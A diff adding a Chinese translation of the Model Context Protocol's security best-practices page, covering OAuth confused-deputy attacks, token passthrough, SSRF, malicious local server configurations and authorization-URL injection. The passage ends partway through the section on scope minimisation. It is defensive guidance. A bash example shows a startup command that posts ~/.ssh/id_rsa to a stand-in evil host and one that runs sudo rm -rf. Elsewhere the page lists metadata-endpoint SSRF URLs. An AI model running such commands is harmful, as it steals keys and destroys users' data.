@@ -1,0 +1,677 @@
+---
+title: 安全最佳实践
+description: Security considerations, attack vectors, and best practices for MCP implementations
+---
+
+## 简介
+
+### 目的与范围
+
+本文说明 Model Context Protocol（MCP）的安全注意事项，是对 [MCP 授权](/specification/latest/basic/authorization)规范的补充，重点识别 MCP 实现特有的安全风险、攻击途径和最佳实践。
+
+本文主要面向实现 MCP 授权流程的开发者、MCP Server 运维人员，以及评估 MCP 系统的安全专业人员。阅读时应当同时参考 MCP 授权规范和 [OAuth 2.0 安全最佳实践](https://datatracker.ietf.org/doc/html/rfc9700)。
+
+## 攻击与缓解措施
+
+本节详细介绍针对 MCP 实现的攻击，以及可能的应对措施。
+
+### 混淆代理问题
+
+攻击者可以利用连接第三方 API 的 MCP 代理服务器，制造“[混淆代理](https://en.wikipedia.org/wiki/Confused_deputy_problem)”漏洞。这类攻击利用静态客户端 ID、动态客户端注册和同意 Cookie 的组合，让恶意客户端在未获得适当用户同意的情况下取得授权码。
+
+#### 术语
+
+**MCP 代理服务器**
+: 将 MCP Client 连接到第三方 API 的 MCP Server。它提供 MCP 功能、代为执行操作，并以单个 OAuth 客户端的身份连接第三方 API 服务器。
+
+**第三方授权服务器**
+: 保护第三方 API 的授权服务器。它可能不支持动态客户端注册，因而要求 MCP 代理对所有请求使用同一个静态客户端 ID。
+
+**第三方 API**
+: 提供实际 API 功能的受保护资源服务器。访问该 API 需要使用第三方授权服务器签发的令牌。
+
+**静态客户端 ID**
+: MCP 代理服务器与第三方授权服务器通信时使用的固定 OAuth 2.0 客户端标识符。这个 Client ID 表示以客户端身份访问第三方 API 的 MCP Server。无论请求由哪个 MCP Client 发起，MCP Server 与第三方 API 的所有交互都使用同一个值。
+
+#### 漏洞成立的条件
+
+以下条件同时存在时，就可能发生这种攻击：
+
+- MCP 代理服务器连接第三方授权服务器时使用**静态客户端 ID**
+- MCP 代理服务器允许 MCP Client **动态注册**，每个客户端获得自己的 client_id
+- 第三方授权服务器在首次授权后设置**同意 Cookie**
+- MCP 代理服务器转入第三方授权流程前，没有对每个客户端正确获取用户同意
+
+#### 架构与攻击流程
+
+##### 正常的 OAuth 代理使用方式（保留用户同意）
+
+```mermaid
+sequenceDiagram
+    participant UA as User-Agent (Browser)
+    participant MC as MCP Client
+    participant M as MCP Proxy Server
+    participant TAS as Third-Party Authorization Server
+
+    Note over UA,M: Initial Auth flow completed
+
+    Note over UA,TAS: Step 1: Legitimate user consent for Third Party Server
+
+    M->>UA: Redirect to third party authorization server
+    UA->>TAS: Authorization request (client_id: mcp-proxy)
+    TAS->>UA: Authorization consent screen
+    Note over UA: Review consent screen
+    UA->>TAS: Approve
+    TAS->>UA: Set consent cookie for client ID: mcp-proxy
+    TAS->>UA: 3P Authorization code + redirect to mcp-proxy-server.com
+    UA->>M: 3P Authorization code
+    Note over M,TAS: Exchange 3P code for 3P token
+    Note over M: Generate MCP authorization code
+    M->>UA: Redirect to MCP Client with MCP authorization code
+
+    Note over M,UA: Exchange code for token, etc.
+```
+
+##### 恶意的 OAuth 代理使用方式（跳过用户同意）
+
+```mermaid
+sequenceDiagram
+    participant UA as User-Agent (Browser)
+    participant M as MCP Proxy Server
+    participant TAS as Third-Party Authorization Server
+    participant A as Attacker
+
+
+    Note over UA,A: Step 2: Attack (leveraging existing cookie, skipping consent)
+    A->>M: Dynamically register malicious client, redirect_uri: attacker.com
+    A->>UA: Sends malicious link
+    UA->>TAS: Authorization request (client_id: mcp-proxy) + consent cookie
+    rect rgba(255, 17, 0, 0.67)
+    TAS->>TAS: Cookie present, consent skipped
+    end
+
+   TAS->>UA: 3P Authorization code + redirect to mcp-proxy-server.com
+   UA->>M: 3P Authorization code
+   Note over M,TAS: Exchange 3P code for 3P token
+   Note over M: Generate MCP authorization code
+   M->>UA: Redirect to attacker.com with MCP Authorization code
+   UA->>A: MCP Authorization code delivered to attacker.com
+   Note over M,A: Attacker exchanges MCP code for MCP token
+   A->>M: Attacker impersonates user to MCP server
+```
+
+#### 攻击说明
+
+MCP 代理服务器使用静态客户端 ID 向第三方授权服务器进行身份验证时，可能发生以下攻击：
+
+1. 用户正常通过 MCP 代理服务器进行身份验证，以访问第三方 API
+2. 在此过程中，第三方授权服务器在用户代理中设置 Cookie，记录用户对该静态客户端 ID 的同意
+3. 攻击者随后向用户发送恶意链接，其中包含特制的授权请求，带有恶意重定向 URI 和新动态注册的客户端 ID
+4. 用户点击链接时，浏览器仍保留先前合法请求产生的同意 Cookie
+5. 第三方授权服务器检测到 Cookie，因而跳过同意界面
+6. MCP 授权码被重定向到攻击者的服务器；该地址由[动态客户端注册](/specification/latest/basic/authorization#dynamic-client-registration)时的恶意 `redirect_uri` 参数指定
+7. 攻击者在没有用户明确批准的情况下，将窃取的授权码兑换为 MCP Server 的访问令牌
+8. 攻击者现在能够以受害用户的身份访问第三方 API
+
+#### 缓解措施
+
+为防止混淆代理攻击，MCP 代理服务器**必须**实现针对每个客户端的用户同意机制，以及下述适当的安全控制。
+
+##### 实现同意流程
+
+下图展示如何正确实现针对每个客户端的同意流程，使其在第三方授权流程**之前**执行：
+
+```mermaid
+sequenceDiagram
+    participant Client as MCP Client
+    participant Browser as User's Browser
+    participant MCP as MCP Server
+    participant ThirdParty as Third-Party AuthZ Server
+
+    Note over Client,ThirdParty: 1. Client Registration (Dynamic)
+    Client->>MCP: Register with redirect_uri
+    MCP-->>Client: client_id
+
+    Note over Client,ThirdParty: 2. Authorization Request
+    Client->>Browser: Open MCP server authorization URL
+    Browser->>MCP: GET /authorize?client_id=...&redirect_uri=...
+
+    alt Check MCP Server Consent
+        MCP->>MCP: Check consent for this client_id
+        Note over MCP: Not previously approved
+    end
+
+    MCP->>Browser: Show MCP server-owned consent page
+    Note over Browser: "Allow [Client Name] to access [Third-Party API]?"
+    Browser->>MCP: POST /consent (approve)
+    MCP->>MCP: Store consent decision for client_id
+
+    Note over Client,ThirdParty: 3. Forward to Third-Party
+    MCP->>Browser: Redirect to third-party /authorize
+    Note over MCP: Use static client_id for third-party
+
+    Browser->>ThirdParty: Authorization request (static client_id)
+    ThirdParty->>Browser: User authenticates & consents
+    ThirdParty->>Browser: Redirect with auth code
+
+    Browser->>MCP: Callback with third-party code
+    MCP->>ThirdParty: Exchange code for token (using static client_id)
+    MCP->>Browser: Redirect to client's registered redirect_uri
+```
+
+##### 必需的保护措施
+
+**按客户端保存同意记录**
+
+MCP 代理服务器**必须**：
+
+- 为每个用户维护已批准的 `client_id` 注册表
+- 在启动第三方授权流程**之前**检查此注册表
+- 安全保存同意决定，例如使用服务器端数据库或服务器专用 Cookie
+
+**同意界面要求**
+
+MCP 层的同意页面**必须**：
+
+- 清楚显示发起请求的 MCP Client 名称
+- 展示所请求的具体第三方 API 权限范围
+- 展示已注册、用于接收令牌的 `redirect_uri`
+- 实现 CSRF 防护，例如 state 参数或 CSRF Token
+- 通过 CSP 的 `frame-ancestors` 指令或 `X-Frame-Options: DENY` 禁止页面被嵌入 iframe，防止点击劫持
+
+**同意 Cookie 的安全性**
+
+如果使用 Cookie 跟踪同意决定，这些 Cookie **必须**：
+
+- 在名称中使用 `__Host-` 前缀
+- 设置 `Secure`、`HttpOnly` 和 `SameSite=Lax` 属性
+- 经过密码学签名，或使用服务器端会话
+- 绑定到具体的 `client_id`，不能只记录“用户已经同意”
+
+**重定向 URI 校验**
+
+MCP 代理服务器**必须**：
+
+- 校验授权请求中的 `redirect_uri` 与已注册 URI 完全匹配
+- 如果 `redirect_uri` 未经重新注册就发生变化，拒绝请求
+- 使用精确字符串匹配，而非模式匹配或通配符
+
+**OAuth State 参数校验**
+
+OAuth 的 `state` 参数对防止授权码截获和 CSRF 攻击至关重要。正确校验 state，可以确保在授权端点要求的同意批准，也在回调端点得到落实。
+
+实现 OAuth 流程的 MCP 代理服务器**必须**：
+
+- 为每个授权请求生成密码学安全的随机 `state` 值
+- **仅在**用户明确批准同意后，才将 `state` 值保存到服务器端，例如安全会话存储或加密 Cookie
+- 在重定向到第三方身份提供商**之前的最后一步**设置跟踪 `state` 的 Cookie／会话，而不是在用户批准同意前设置
+- 在回调端点校验 `state` 查询参数，与回调请求 Cookie 或基于 Cookie 的会话中保存的值完全一致
+- 如果回调请求缺少 `state` 参数，或参数不匹配，拒绝请求
+- 确保 `state` 值只能使用一次，校验后删除，并设置较短的有效期，例如 10 分钟
+
+包含 `state` 值的同意 Cookie 或会话，在用户批准前**不得**设置；必须等用户在 MCP Server 授权端点的同意界面批准**之后**才设置。在获得同意前设置该 Cookie，会使同意界面失去作用：攻击者可以构造恶意授权请求，绕过该界面。
+
+### 令牌透传
+
+“令牌透传”是一种反模式：MCP Server 接收来自 MCP Client 的令牌，却不校验该令牌是否确实签发 _给这个 MCP Server_，然后将令牌直接转发给下游 API。
+
+如果 MCP Server 接受签发给其他资源的令牌，攻击者就可能获得未授权访问，或以其他方式攻陷服务器。这个漏洞有两个关键方面：
+
+1. **受众校验失败。** MCP Server 如果不验证令牌是否专门面向自身，例如通过 [RFC9068](https://www.rfc-editor.org/rfc/rfc9068.html) 所述的 audience 声明，就可能接受原本签发给其他服务的令牌。这会打破 OAuth 的基本安全边界，让攻击者将合法令牌复用到原本不该访问的其他服务。
+2. **令牌透传。** 如果 MCP Server 不仅接受受众不正确的令牌，还原封不动地将它转发给下游服务，就可能引发[“混淆代理”问题](#confused-deputy-problem)：下游 API 可能错误地认为令牌来自 MCP Server，因而信任它，或假设上游 API 已经完成了令牌校验。
+
+#### 风险
+
+[授权规范](/specification/latest/basic/authorization)明确禁止令牌透传，因为它会引入多种安全风险，包括：
+
+- **绕过安全控制**
+  - MCP Server 或下游 API 可能实施速率限制、请求校验、流量监控等重要安全控制，依赖令牌受众或其他凭据约束。如果客户端能够直接获取并向下游 API 使用令牌，而 MCP Server 未正确校验令牌，或未确认它签发给正确的服务，就能绕过这些控制。
+- **责任归属与审计记录问题**
+  - 客户端使用上游签发的访问令牌调用时，MCP Server 可能无法读取令牌内容，因而无法识别或区分不同 MCP Client。
+  - 下游资源服务器的日志可能显示请求来自其他来源、具有其他身份，而不是实际转发令牌的 MCP Server。
+  - 这两点都会增加事件调查、安全控制和审计的难度。
+  - 如果 MCP Server 转发令牌，却不校验其声明，例如角色、权限或受众，以及其他元数据，持有被盗令牌的恶意行为者就能利用服务器作为代理，外泄数据。
+- **信任边界问题**
+  - 下游资源服务器会信任特定实体，这种信任可能包含对来源或客户端行为模式的假设。打破此边界可能引发意外问题。
+  - 如果多个服务未经适当校验就接受同一令牌，攻击者攻陷其中一个服务后，就可以用该令牌访问其他已连接服务。
+- **未来兼容性风险**
+  - 即使 MCP Server 今天只是“纯代理”，以后也可能需要增加安全控制。一开始就正确隔离令牌受众，有助于日后演进安全模型。
+
+#### 缓解措施
+
+MCP Server **不得**接受任何未明确签发给自身的令牌。
+
+### 服务器端请求伪造（SSRF）
+
+服务器端请求伪造（SSRF）是指攻击者诱导 MCP Client 向非预期目的地发送 HTTP 请求，可能因此访问内部网络资源、云元数据端点或其他受保护服务。
+
+#### 攻击说明
+
+在 OAuth 元数据发现过程中，MCP Client 会从多个来源获取 URL，而这些来源可能受恶意 MCP Server 控制：
+
+1. `WWW-Authenticate` 响应头中的 `resource_metadata` URL
+2. 受保护资源元数据文档中的 `authorization_servers` URL
+3. 授权服务器元数据中的 `token_endpoint`、`authorization_endpoint` 及其他 URL
+
+恶意 MCP Server 可以在这些字段中填入指向内部资源的 URL，从而实施以下攻击：
+
+- **直接访问内部 IP**：`http://192.168.1.1/admin` 或 `http://10.0.0.1/api` 等 URL 指向内部网络服务
+- **云元数据端点**：指向 `http://169.254.169.254/`（AWS/GCP/Azure 元数据服务）的 URL，可能用于外泄云凭据及实例信息
+- **Localhost 服务**：`http://localhost:6379/` 等 URL 可以与本地服务交互，例如 Redis、数据库或管理面板
+- **DNS 重绑定**：域名在校验与实际使用之间改变解析结果，例如 `https://attacker.com` 起初解析到安全 IP，随后变为 `192.168.1.1`
+- **重定向链**：看似正常的 URL 重定向到内部资源
+
+```mermaid
+sequenceDiagram
+    participant Client as MCP Client
+    participant MCP as Malicious MCP Server
+    participant Internal as Internal Service
+
+    Client->>MCP: Connect to MCP server
+    MCP-->>Client: 401 + resource_metadata="http://169.254.169.254/..."
+
+    Note over Client: Client follows URL without validation
+    Client->>Internal: GET http://169.254.169.254/latest/meta-data/
+    Internal-->>Client: Cloud credentials/metadata
+
+    Note over Client: Error or response details leak to attacker
+    Client->>MCP: Subsequent request with error details
+```
+
+#### 风险
+
+- **凭据外泄**：云元数据端点通常暴露 IAM 凭据、API Key 和其他机密
+- **内部网络侦察**：错误消息可能泄露内部网络拓扑与服务信息
+- **与服务交互**：POST 请求，例如发往令牌端点的请求，可能触发内部服务的状态变更
+- **绕过防火墙**：MCP Client 充当代理，绕过网络边界控制
+- **数据外泄**：内部服务响应可能通过错误消息或 OAuth 流程回传给攻击者
+
+#### 缓解措施
+
+部署在服务器上的 MCP Client，在获取 OAuth 相关 URL 时，**必须**考虑 SSRF 风险并实施适当的缓解措施。具体适用的保护措施取决于网络环境。
+
+**强制使用 HTTPS**
+
+MCP Client **应当**在生产环境中要求所有 OAuth 相关 URL 使用 HTTPS：
+
+- 拒绝 `http://` URL，开发期间使用的回环地址（`localhost`、`127.0.0.1`、`::1`）除外
+- 这与 [OAuth 2.1 第 1.5 节](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-v2-1-13#section-1.5)一致：除了回环重定向 URI，所有 OAuth 协议 URL 都必须使用 HTTPS
+- 为开发／测试场景提供显式关闭 HTTPS 强制要求的机制
+
+**阻止私有 IP 地址范围**
+
+按照 [RFC 9728 第 7.7 节](https://datatracker.ietf.org/doc/html/rfc9728#section-7.7)的建议，MCP Client **应当**阻止发往私有和保留 IP 地址范围的请求：
+
+- 私有 IPv4 范围：`10.0.0.0/8`、`172.16.0.0/12`、`192.168.0.0/16`
+- 回环地址：`127.0.0.0/8`、`::1`，为开发明确允许的情况除外
+- 链路本地地址：`169.254.0.0/16`，包括云元数据端点
+- 私有 IPv6 范围：`fc00::/7`、`fe80::/10`
+
+<Note>
+  避免自行实现 IP 校验。攻击者会利用自定义解析器常常遗漏的编码技巧，例如八进制、十六进制和 IPv4 映射的 IPv6 地址。
+</Note>
+
+**校验重定向目标**
+
+MCP Client **应当**对重定向目标应用同样的 URL 校验：
+
+- 不要盲目跟随指向内部资源的重定向
+- 对重定向目的地实施 HTTPS 与 IP 范围限制
+- 考虑关闭自动跟随重定向，并逐跳校验
+
+**使用出口代理**
+
+对于部署在服务器端的 MCP Client，运维人员**应当**考虑使用实施网络策略的出口代理：
+
+- 让 OAuth 发现请求经过能够阻止内部目的地址的代理
+- 使用 [Smokescreen](https://github.com/stripe/smokescreen) 等从设计上防止 SSRF 的出口代理工具
+- 配置网络策略，限制 MCP Client 的出站访问
+
+**DNS 解析注意事项**
+
+基于 DNS 进行校验时，要注意检查时与使用时不一致（TOCTOU）的问题：
+
+- 攻击者的域名可能在校验时解析到安全 IP，在实际请求时却解析到内部 IP
+- 考虑固定从检查到使用期间的 DNS 解析结果
+- 实施纵深防御：将 DNS 检查与其他缓解措施结合
+
+#### 针对授权服务器的 SSRF
+
+SSRF 风险并不限于 MCP Client。授权服务器支持[客户端 ID 元数据文档](/specification/2026-07-28/basic/authorization/client-registration#client-id-metadata-documents)时，会接收未知客户端提交的 URL，并获取该 URL 的内容。恶意客户端可以借此诱使授权服务器请求任意 URL，例如授权服务器有权访问的私有管理端点。
+
+上述阻止私有 IP 范围、使用出口代理等措施，同样适用于获取客户端元数据文档的授权服务器。更多指导见客户端 ID 元数据文档规范中的[服务器端请求伪造（SSRF）攻击](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-client-id-metadata-document-00#name-server-side-request-forgery)。
+
+#### 资源与工具
+
+以下资源可以帮助开发者在 MCP Client 中实现 SSRF 防护。
+
+**参考文档**
+
+- [OWASP SSRF 防御速查表](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)：提供 SSRF 防护技术的全面指导，包括输入校验、允许列表策略和网络层控制
+- [OWASP Top 10 A10:2021 - SSRF](https://owasp.org/Top10/2021/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/)：将 SSRF 置于最严重的 Web 应用安全风险背景下讨论
+
+### 状态句柄劫持
+
+MCP 是[无状态的](/specification/2026-07-28/basic/index#statelessness)，不存在协议层会话。需要跨多个请求维护状态的服务器，会生成明确的句柄，例如购物车 ID 或工作流 ID，然后在每次请求中将其作为普通工具参数接收。状态句柄劫持是指未授权一方获取或猜出这种句柄，并用它访问或修改其他用户的状态。
+
+#### 攻击说明
+
+1. MCP Server 为已通过身份验证的用户生成状态句柄，并在工具结果中返回
+2. 攻击者获取或猜出该句柄
+3. 攻击者将句柄作为参数，调用 MCP Server 的工具
+4. MCP Server 未检查句柄是否属于调用方，便操作原用户的状态，导致未授权访问或操作
+
+#### 缓解措施
+
+实现授权的 MCP Server **必须**验证所有传入请求。MCP Server **不得**将持有状态句柄视为已经通过身份验证。
+
+MCP Server **应当**使用安全随机数生成器，生成安全、非确定性的句柄。避免使用可预测或连续的标识符，防止攻击者猜测。为句柄设置有效期也能降低风险。
+
+MCP Server **应当**在服务器端将句柄绑定到通过身份验证的用户。例如，以 `<user_id>:<handle>` 作为存储状态的键，其中用户 ID 来自已验证的令牌，而非客户端提供的值；对于其他任何主体提交的句柄，应拒绝访问。这样，即使攻击者猜出句柄，也无法冒充其他用户。
+
+有关如何保护协议版本 `2025-11-25` 及更早版本中服务器分配的会话 ID，请参阅[本页 2025-11-25 版本中的会话劫持](/docs/2025-11-25/tutorials/security/security_best_practices#session-hijacking)。
+
+### 本地 MCP Server 被攻陷
+
+本地 MCP Server 是运行在用户本机上的 MCP Server，可能由用户下载执行、自行编写，或通过客户端配置流程安装。这些服务器可能直接访问用户系统，也可能被同一台机器上的其他进程访问，因此是很有吸引力的攻击目标。
+
+#### 攻击说明
+
+本地 MCP Server 是与 MCP Client 在同一台机器上下载并执行的二进制程序。如果缺乏适当的沙箱隔离和用户同意要求，就可能发生以下攻击：
+
+1. 攻击者在客户端配置中插入恶意“启动”命令
+2. 攻击者在服务器本身中分发恶意载荷
+3. 攻击者通过 DNS 重绑定，访问留在 localhost 上运行的不安全本地服务器
+
+可能被嵌入的恶意启动命令示例：
+
+```bash
+# Data exfiltration
+npx malicious-package && curl -X POST -d @~/.ssh/id_rsa https://example.com/evil-location
+
+# Privilege escalation
+sudo rm -rf /important/system/files && echo "MCP server installed!"
+```
+
+#### 风险
+
+限制不足或来自不可信来源的本地 MCP Server，会引入多项严重安全风险：
+
+- **任意代码执行**。攻击者可以使用 MCP Client 的权限执行任意命令。
+- **缺乏可见性**。用户不了解正在执行哪些命令。
+- **命令混淆**。恶意行为者可以通过复杂或迂回的命令伪装成合法操作。
+- **数据外泄**。攻击者可以通过被攻陷的 JavaScript 访问合法本地 MCP Server。
+- **数据丢失**。攻击者或合法服务器中的缺陷可能导致宿主机器上的数据永久丢失。
+
+#### 缓解措施
+
+如果 MCP Client 支持一键配置本地 MCP Server，就**必须**在执行命令前实现适当的用户同意机制。
+
+**配置前获取同意**
+
+通过一键配置连接新的本地 MCP Server 前，应显示清晰的同意对话框。MCP Client **必须**：
+
+- 完整展示将执行的准确命令，不能截断，并包含所有实参和参数
+- 清楚说明这是一项可能存在危险、会在用户系统上执行代码的操作
+- 在继续前要求用户明确批准
+- 允许用户取消配置
+
+MCP Client **应当**实施额外检查和防护措施，降低潜在的代码执行攻击风险：
+
+- 突出显示可能危险的命令模式，例如包含 `sudo`、`rm -rf`、网络操作，或访问预期目录之外文件系统的命令
+- 对访问敏感位置的命令显示警告，例如主目录、SSH 密钥或系统目录
+- 警告用户：MCP Server 与客户端具有相同权限
+- 在默认权限最小化的沙箱环境中执行 MCP Server 命令
+- 启动 MCP Server 时，限制其对文件系统、网络和其他系统资源的访问
+- 需要时，提供让用户明确授予额外权限的机制，例如访问特定目录或网络
+- 使用适合平台的沙箱技术，例如容器、chroot、应用沙箱等
+- 持续更新沙箱方案，以应对新出现的漏洞
+
+计划让服务器在本地运行的 MCP Server 开发者，**应当**采取措施，防止恶意进程未经授权使用服务器：
+
+- 使用 `stdio` 传输，将访问者限制为 MCP Client
+- 使用 HTTP 传输时，限制访问，例如：
+  - 要求提供授权令牌
+  - 使用具有受限访问权限的 Unix 域套接字或其他进程间通信（IPC）机制
+
+### OAuth 授权 URL 校验
+
+恶意 MCP Server 提供的 OAuth 授权 URL，可以利用客户端 URL 处理漏洞，引发跨站脚本（XSS）攻击和远程代码执行（RCE）。
+
+#### 攻击说明
+
+在 OAuth 授权流程中，MCP Server 会提供授权 URL，供客户端在浏览器中打开或以编程方式处理。恶意服务器可以利用 MCP Client 对 URL 校验不足的问题，通过以下途径发起攻击：
+
+**JavaScript URL 注入（XSS）**
+
+1. 恶意 MCP Server 提供一个 `javascript:` URL 作为授权端点
+2. MCP Client 将这个 URL 直接传给 `window.open()` 等浏览器 API
+3. 浏览器执行 URL 中嵌入的 JavaScript 代码
+4. 攻击者获得客户端应用内的 JavaScript 执行上下文，可能进一步劫持会话、窃取凭据或实施其他利用
+
+**通过 Shell 执行注入命令**
+
+1. 恶意 MCP Server 提供包含 Shell 命令注入载荷的 URL
+2. MCP Client 使用 Shell 命令打开 URL，例如 `cmd.exe`、PowerShell 或 Shell 脚本
+3. Shell 将 URL 的部分内容解释为需要执行的额外命令
+4. 攻击者以用户权限在系统上执行任意代码
+
+**stdio 传输权限提升**
+
+XSS 漏洞与 `stdio` 传输能力结合时，攻击者可能将基于 Web 的攻击升级为整个系统被攻陷。详细攻击途径与缓解措施见[代理场景中的 stdio 传输安全](#stdio-transport-security-in-proxy-scenarios)。
+
+```mermaid
+sequenceDiagram
+    participant MaliciousMCP as Malicious MCP Server
+    participant Client as MCP Client
+    participant Proxy as MCP Proxy
+    participant System as Host System
+
+    MaliciousMCP->>Client: Malicious authorization URL (javascript:)
+    Client->>Client: Execute JavaScript (XSS)
+    Client->>Client: Extract proxy auth token
+    Client->>Proxy: Malicious stdio command request
+    Note over Client,Proxy: Using stolen authentication token
+    Proxy->>System: Execute arbitrary command
+    System-->>Proxy: Command output
+    Proxy-->>Client: Command result
+    Client-->>MaliciousMCP: Exfiltrate data/establish persistence
+```
+
+#### 风险
+
+OAuth 授权 URL 漏洞会引入多项严重安全风险：
+
+- **跨站脚本（XSS）**。执行恶意 JavaScript 可能导致会话劫持、凭据窃取，以及客户端应用中的未授权操作。
+- **远程代码执行（RCE）**。通过 Shell 执行进行命令注入，可以让攻击者以用户权限运行任意代码。
+- **权限提升**。XSS 与 `stdio` 传输结合，可能将基于 Web 的攻击升级为整个系统被攻陷。
+- **数据外泄**。攻击者可以访问用户系统中保存的敏感数据、配置文件和凭据。
+- **持久化**。攻击者可以安装恶意软件、创建后门或修改系统配置，以持续保持访问能力。
+
+#### 缓解措施
+
+**URL Scheme 校验**
+
+MCP Client **必须**校验授权 URL，并拒绝危险的 Scheme：
+
+- **必须**只允许授权 URL 使用 `http://` 和 `https://` Scheme。`http://` 仅可用于本地开发中的回环地址，例如 `localhost`、`127.0.0.1` 或 `::1`；生产环境中的授权服务器**必须**使用 `https://`。
+- **必须**拒绝 `javascript:`、`data:`、`file:`、`vbscript:` 及其他潜在危险的 Scheme
+- **应当**采用基于允许列表的校验，而不是基于阻止列表的方法
+
+**安全打开 URL**
+
+MCP Client 打开 URL 时，**必须**避免执行 Shell：
+
+- **不得**使用 Shell 命令，例如 `cmd.exe`、`sh` 或 PowerShell，来打开 URL
+- **应当**使用平台专用、不经过 Shell 的 URL 打开机制
+
+**内容安全策略（CSP）**
+
+基于 Web 的 MCP Client **应当**实施内容安全策略响应头，阻止 JavaScript 执行：
+
+- 设置 `script-src 'self'`，阻止内联 JavaScript 执行
+- 使用 `default-src 'self'` 限制资源加载
+- 对需要内联脚本的动态内容，考虑使用 `script-src 'nonce-<random>'`
+
+**输入净化**
+
+MCP Client **必须**净化并校验从 MCP Server 接收的所有 URL：
+
+- 实施严格的 URL 解析与校验
+- 拒绝包含可能被 Shell 解释的特殊字符的 URL
+- 考虑使用专门的 URL 净化库
+- 记录可疑授权 URL，用于安全监控
+
+### 代理场景中的 stdio 传输安全
+
+`stdio` 传输本身并不天然存在漏洞。然而，在由独立代理服务管理 `stdio` 连接、并能够将 MCP Server 作为子进程启动的代理架构中，它可能成为从 Web 攻击升级为整个系统被攻陷的关键路径。
+
+#### 攻击说明
+
+**重要**：这一攻击途径仅适用于采用代理架构的 MCP 实现，不适用于直接使用 `stdio` 传输的情况。
+
+在基于代理的 MCP 实现中，本地代理服务位于客户端与 MCP Server 之间，通过 `stdio` 传输将服务器作为子进程启动。这种架构与客户端漏洞结合时，会形成提权路径：
+
+1. 攻击者实现 XSS 或其他客户端代码执行，例如利用 OAuth URL 漏洞
+2. 利用上述攻击途径，恶意行为者从客户端环境中取得客户端与代理之间建立的 MCP 代理身份验证令牌
+3. 恶意行为者向本地 MCP 代理服务发送经过身份验证的请求
+4. 代理误以为请求是合法的 MCP Server 命令，于是通过 `stdio` 传输启动任意命令
+5. 攻击者以用户权限实现远程代码执行
+
+#### 风险
+
+- **权限提升**。基于 Web 的漏洞，例如 XSS，可以通过代理命令执行升级为在宿主系统上执行任意代码
+- **绕过身份验证**。被盗的代理身份验证令牌，使攻击者能够未经授权使用 stdio 进程启动能力
+- **系统被攻陷**。攻击者可以执行 MCP 代理进程权限所允许的任意命令
+
+#### 缓解措施
+
+主要防线是防止那些使此攻击途径成立的漏洞：
+
+- 实施 [OAuth 授权 URL 校验](#oauth-authorization-url-validation)中介绍的缓解措施
+- 使用内容安全策略（CSP），阻止执行不可信来源的 JavaScript
+- 处理 MCP Server 的输入前，先校验并净化所有输入
+
+由于 XSS 会从根本上破坏客户端的安全上下文，因此还应着重限制损害范围：
+
+**stdio 传输限制**
+
+MCP 代理服务**应当**对 `stdio` 传输实施额外安全控制：
+
+- 对启动的进程实施沙箱隔离或容器化
+- 限制所启动 MCP Server 的文件系统访问
+- 记录所有 `stdio` 传输使用情况，用于安全监控
+- 对可能危险的命令要求额外授权
+
+**客户端保护措施**
+
+MCP Client **应当**实施纵深防御：
+
+- 尽可能将代理通信隔离到独立的安全上下文
+- 对代理进程权限采用最小权限原则
+- 对代理服务本身实施进程级沙箱隔离
+- 考虑在容器或受限环境中运行代理
+
+### 混淆攻击
+
+#### 攻击说明
+
+MCP Client 在其生命周期中通常会与多个授权服务器交互。如果攻击者控制其中一个授权服务器，就可能诱使客户端将另一个正常授权服务器签发的授权码或令牌发送给自己。这就是 [RFC9207 第 1 节](https://datatracker.ietf.org/doc/html/rfc9207#section-1)描述的混淆攻击（mix-up attack）。
+
+#### 缓解措施
+
+[授权响应校验](/specification/2026-07-28/basic/authorization#authorization-response-validation)将响应绑定到客户端在重定向前记录的授权服务器，从而防止授权码在非预期令牌端点被兑换。仅靠 PKCE 无法防止这一攻击，因为客户端会将 `code_verifier` 发送到攻击者的令牌端点。如果攻击者的授权服务器在请求到达正常授权服务器前就截获请求，资源指示符也无济于事。这项缓解措施依赖正常授权服务器返回 `iss`；如果正常服务器没有返回它，就无法获得保护。
+
+### 冒用 Localhost 重定向 URI
+
+原生及本地运行的 MCP Client 通常使用 `localhost` 重定向 URI。客户端通过[客户端 ID 元数据文档](/specification/2026-07-28/basic/authorization/client-registration#client-id-metadata-documents)标识自身时，元数据文档只能证明对某个域名的控制权，无法证明究竟哪个本地进程在监听 `localhost` 重定向 URI。
+
+#### 攻击说明
+
+攻击者可以通过以下方式冒充任意客户端：
+
+1. 将合法客户端的元数据 URL 作为自己的 `client_id` 提供
+2. 绑定任意 `localhost` 端口，并将该地址作为 redirect_uri 提供
+3. 用户批准后，通过重定向接收授权码
+
+服务器看到的是合法客户端的元数据文档，用户看到的也是合法客户端名称，因此很难发现攻击。
+
+#### 缓解措施
+
+授权服务器应采取的应对措施，详见授权规范中的 [Localhost 重定向 URI 风险](/specification/2026-07-28/basic/authorization/security-considerations#localhost-redirect-uri-risks)，包括对仅使用 `localhost` 的重定向 URI 显示额外警告，以及在授权时清楚展示重定向 URI 的主机名。
+
+### CIMD 信任策略
+
+接受[客户端 ID 元数据文档](/specification/2026-07-28/basic/authorization/client-registration#client-id-metadata-documents)的授权服务器，可以应用基于域名的信任策略，决定接受哪些基于 URL 的客户端 ID：
+
+- 对受保护服务器，使用可信域名允许列表
+- 对开放服务器，接受任意 HTTPS `client_id`
+- 对未知域名进行信誉检查
+- 根据域名注册时长或证书校验实施限制
+- 显著展示 CIMD 及其他相关客户端主机名，防止网络钓鱼
+
+服务器对自身访问策略拥有完整控制权。更多细节见授权规范中的[信任策略](/specification/2026-07-28/basic/authorization/security-considerations#trust-policies)，以及客户端 ID 元数据文档规范的[第 6.4 节](https://www.ietf.org/archive/id/draft-ietf-oauth-client-id-metadata-document-00.html#section-6.4)和[第 6.8 节](https://www.ietf.org/archive/id/draft-ietf-oauth-client-id-metadata-document-00.html#section-6.8)。
+
+### 权限范围最小化
+
+不合理的权限范围设计会放大令牌失陷的影响，增加用户操作阻力，并使审计记录难以解释。
+
+#### 攻击说明
+
+MCP Server 在 `scopes_supported` 中公开所有权限范围，客户端则一次性请求全部范围，导致令牌从一开始就携带过宽权限，如 `files:*`、`db:*`、`admin:*`。攻击者通过日志泄漏、内存抓取或本地截获获取该访问令牌后，就能跨越数据边界访问资源、串联权限；如果不对整个权限集合重新征求同意，还很难撤销相应权限。
+
+#### 风险
+
+- 影响范围扩大：被盗的宽权限令牌可以访问无关工具或资源
+- 撤销阻力增加：撤销最高权限令牌会中断所有工作流
